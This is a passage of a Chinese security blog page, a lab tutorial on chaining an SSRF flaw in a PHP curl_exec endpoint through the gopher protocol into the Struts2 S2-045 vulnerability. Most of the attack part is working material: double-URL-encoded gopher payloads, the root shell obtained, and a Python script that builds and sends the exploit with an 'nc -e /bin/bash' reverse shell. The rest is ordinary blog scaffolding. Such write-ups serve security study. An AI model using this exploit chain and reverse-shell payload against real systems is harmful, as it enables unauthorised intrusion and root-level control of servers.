+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20&#x2F;ssrf&#x2F;base&#x2F;get.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20192.168.0.109%0d%0A</span><br></pre></td></tr></table></figure>
+
+<p>那我们现在是否可以这样来组成我们的URL？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url&#x3D;gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20&#x2F;ssrf&#x2F;base&#x2F;get.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20192.168.0.109%0d%0A</span><br></pre></td></tr></table></figure>
+
+<p>我们来测试下，结果如下：</p>
+<img src="https://ckcah.github.io/images/CVE-2020-9484/5.png">
+
+<p>发现并没有出现get页面的hello  Margin，说明请求失败，这个地方卡了一会，发现是因为在PHP在接收到参数后会做一次URL的解码，正如我们上图所看到的，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。编码结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url&#x3D;gopher%3A%2F%2F192.168.0.109%3A80%2F_GET%2520%2Fssrf%2Fbase%2Fget.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.0.109%250d%250A</span><br></pre></td></tr></table></figure>
+
+<p>此时发起请求，得到如下结果：</p>
+<img src="https://ckcah.github.io/images/CVE-2020-9484/6.png">
+
+<p>发现已经正常，此时便说明我们的环境没有问题，SSRF漏洞利用正常，开始接下来的步骤。</p>
+<p>第二步：</p>
+<p>准备好struts2-045漏洞的利用代码，并进行二次编码，需要注意的是Content-Type中放了主要的漏洞利用代码，并且特殊字符多，将其单独进行编码，步骤如下：</p>
+<p><strong>1.将gopher协议一直到Content-Type进行二次编码</strong></p>
+<p><strong>2.将Content-Type的值所有字符进行URL二次编码</strong></p>
+<p>最终得到如下结果(太长，不列中间内容，省略部分为Content-type内容)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F192.168.0.119%3A8080%2F_GET%2520%2FS2-045%2F%2520HTTP%2F1.1%250d%250aHost%3A192.168.0.119%250d%250aContent-Type%3A ......... %0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>最终可以获取shell，结果如下图：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -l 6666iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再试错的过程中发现：URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码</p>
+<p>最后附上编码脚本（python2.7）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: UTF-8 -*-import urllib2,urllib</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url&#x3D;&quot;header &#x3D; &quot;&quot;&quot;gopher:&#x2F;&#x2F;192.168.0.119:8080&#x2F;_GET &#x2F;S2-045&#x2F; HTTP&#x2F;1.1Host:192.168.0.119Content-Type:&quot;&quot;&quot;cmd &#x3D; &quot;nc -e &#x2F;bin&#x2F;bash 192.168.0.109 6666&quot;content_type &#x3D; &quot;&quot;&quot;自己填写(不要有换行)&quot;&quot;&quot;header_encoder &#x3D; &quot;&quot;content_type_encoder &#x3D; &quot;&quot;content_type_encoder_2 &#x3D; &quot;&quot;url_char &#x3D; [&quot; &quot;]nr &#x3D; &quot;\r\n&quot;</span><br><span class="line"># 编码请求头for single_char in header:    if single_char in url_char:        header_encoder +&#x3D; urllib.quote(urllib.quote(single_char,&#39;utf-8&#39;),&#39;utf-8&#39;)    else:        header_encoder +&#x3D; single_char</span><br><span class="line">header_encoder &#x3D; header_encoder.replace(&quot;\n&quot;,urllib.quote(urllib.quote(nr,&#39;utf-8&#39;),&#39;utf-8&#39;))</span><br><span class="line"># 编码content-type，第一次编码for single_char in content_type:    # 先转为ASCII,在转十六进制即可变为URL编码    content_type_encoder +&#x3D; str(hex(ord(single_char)))content_type_encoder &#x3D; content_type_encoder.replace(&quot;0x&quot;,&quot;%&quot;) + urllib.quote(nr,&#39;utf-8&#39;)# 编码content-type，第二次编码for single_char in content_type_encoder:    # 先转为ASCII,在转十六进制即可变为URL编码    content_type_encoder_2 +&#x3D; str(hex(ord(single_char)))content_type_encoder_2 &#x3D; content_type_encoder_2.replace(&quot;0x&quot;,&quot;%&quot;)exp &#x3D; url + header_encoder + content_type_encoder_2print exprequest &#x3D; urllib2.Request(exp)response &#x3D; urllib2.urlopen(request).read()print response</span><br></pre></td></tr></table></figure>
+
+
+
+<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"theme":"#FADFA3","loop":true,"video":{"url":"http://mpvideo.qpic.cn/0b787eaakaaa2qaj7beepvpfb6odax4qabia.f10002.mp4?dis_k=b88aa0f06da1be97fc4d91c06dc66ce8&dis_t=1590277138"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/24/CVE-2020-9484/" rel="next" title="cve-2020-9484反序列化代码执行漏洞通告">
+                <i class="fa fa-chevron-left"></i> cve-2020-9484反序列化代码执行漏洞通告
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/26/%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E8%AF%A5%E5%A6%82%E4%BD%95%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-2/" rel="prev" title="黑客入侵该如何应急排查(2)">
+                黑客入侵该如何应急排查(2) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+  
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/emperor.jpg"
+                alt="bosch cheng" />
+            
+              <p class="site-author-name" itemprop="name">bosch cheng</p>
+              <p class="site-description motion-element" itemprop="description">在这片海洋中，如若无法向上攀游，就只有往下沉沦</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7Carchive">
+              
+                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ckcah" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/whaites2" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.facebook.com/bing.cheng.5682" target="_blank" title="FB Page">
+                      
+                        <i class="fa fa-fw fa-facebook"></i>FB Page</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bosch cheng</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v="></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: '3nEcwhMJTxkWHiNp8cMyOlAI-gzGzoHsz',
+        appKey: 'wxnCuxw6V0b0lAgx5kOUUOSp',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3nEcwhMJTxkWHiNp8cMyOlAI-gzGzoHsz", "wxnCuxw6V0b0lAgx5kOUUOSp");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
